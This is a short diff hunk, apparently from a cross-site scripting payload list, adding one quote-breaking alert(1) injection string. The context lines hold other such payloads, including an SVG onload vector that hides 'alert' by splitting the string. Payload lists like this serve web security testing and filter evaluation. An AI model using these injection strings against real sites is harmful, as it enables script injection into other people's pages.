@@ -29,3 +29,5 @@ Other
 "><svg/onload​=setTimeout`${'ale'+'rt'}(1)`>
 javascript:alert(1)
 \"-alert(1)}//
+\';alert(1)//
+
